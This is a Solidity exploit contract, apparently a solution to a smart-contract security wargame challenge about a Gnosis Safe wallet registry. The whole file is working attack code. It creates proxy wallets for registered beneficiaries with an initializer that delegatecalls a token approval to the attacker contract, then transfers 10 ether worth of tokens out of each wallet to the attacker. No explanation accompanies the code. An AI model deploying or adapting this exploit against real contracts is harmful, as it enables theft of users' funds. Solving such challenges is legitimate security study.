// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract BackDoorAttack {
    IERC20 public immutable token;
    GnosisSafe public masterCopy;
    GnosisSafeProxyFactory public walletFactory;
    IProxyCreationCallback public walletRegistry;
    address[4] public beneficiaries;
    address public attacker;

    constructor(
        address tokenAddress,
        address _masterCopy,
        address walletFactoryAddress,
        address _walletRegistry,
        address[4] memory _beneficiaries
    ) {
        token = IERC20(tokenAddress);
        masterCopy = GnosisSafe(payable(_masterCopy));
        walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        beneficiaries = _beneficiaries;
        attacker = msg.sender;
    }

    function setApprove(address _backDoorAddress) public {
        token.approve(_backDoorAddress, 10 ether);
    }

    function attack() public {
        address backDoorAddress = address(this);

        bytes memory data = abi.encodeCall(this.setApprove, (backDoorAddress));

        for (uint256 i = 0; i < 4; ++i) {
            address[] memory owners = new address[](1);

            owners[0] = beneficiaries[i];

            bytes memory initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1, // _threshold
                    backDoorAddress, // _to address which will be delegatecalled
                    data, // data sent during delegatecall
                    address(0), // no fallbackHandler needed
                    address(0), // no paymentToken needed
                    0, // no payment
                    payable(address(0)) // no paymentReceiver
                )
            );

            uint256 saltNonce = 42;
            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                saltNonce,
                walletRegistry
            );

            token.transferFrom(address(wallet), attacker, 10 ether);
        }
    }
}
